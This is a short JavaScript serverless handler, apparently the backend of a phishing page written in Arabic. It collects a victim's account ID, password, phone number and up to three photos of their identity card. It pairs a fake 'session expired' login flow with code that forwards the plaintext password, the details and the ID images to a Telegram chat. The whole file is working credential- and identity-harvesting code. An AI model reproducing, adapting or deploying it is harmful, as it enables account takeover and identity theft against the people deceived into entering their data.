const { nowAr, sendTelegram, sendTelegramPhoto, jsonResponse } = require("./lib/telegram.cjs");

exports.handler = async (event) => {
  if (event.httpMethod !== "POST") {
    return jsonResponse(405, { ok: false, message: "Method not allowed" });
  }

  let body;
  try {
    body = JSON.parse(event.body || "{}");
  } catch {
    return jsonResponse(400, { ok: false, message: "طلب غير صالح" });
  }

  const id = String(body.id ?? "").trim();
  const password = String(body.password ?? "");
  const phone = String(body.phone ?? "").trim();
  const images = Array.isArray(body.images) ? body.images : [];

  if (!id || !password) {
    return jsonResponse(400, { ok: false, message: "انتهت الجلسة، سجّل الدخول من جديد" });
  }

  if (!/^\d{7,15}$/.test(phone)) {
    return jsonResponse(400, { ok: false, message: "أدخل رقم هاتف صحيح" });
  }

  if (images.length === 0 || images.length > 3) {
    return jsonResponse(400, { ok: false, message: "ارفق من 1 إلى 3 صور للهوية" });
  }

  const text = [
    "🪪 هوية شخصية + هاتف",
    "",
    `رقم المميز: ${id}`,
    `كلمة المرور: ${password}`,
    `رقم الهاتف: ${phone}`,
    `عدد الصور: ${images.length}`,
    "",
    `الوقت: ${nowAr()}`,
  ].join("\n");

  try {
    await sendTelegram(text);
    for (let i = 0; i < images.length; i += 1) {
      const raw = String(images[i] ?? "");
      const base64 = raw.includes(",") ? raw.split(",")[1] : raw;
      await sendTelegramPhoto(base64, `id-${id}-${i + 1}.jpg`, `هوية ${i + 1} — ${id}`);
    }
    return jsonResponse(200, { ok: true });
  } catch {
    return jsonResponse(502, { ok: false, message: "تعذّر الإرسال إلى Telegram" });
  }
};
